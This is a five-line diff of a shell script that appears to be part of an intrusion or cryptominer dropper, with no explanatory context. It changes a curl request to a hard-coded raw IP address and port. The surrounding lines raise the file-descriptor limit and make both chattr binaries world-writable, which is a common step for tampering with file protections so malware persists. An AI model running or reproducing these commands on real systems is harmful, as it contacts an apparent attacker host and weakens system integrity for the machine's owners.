@@ -1,5 +1,5 @@
 #!/bin/sh
-curl http://122.114.8.33:8000
+curl http://122.114.8.33:8000/something
 ulimit -n 65535
 chmod 777 /usr/bin/chattr
 chmod 777 /bin/chattr
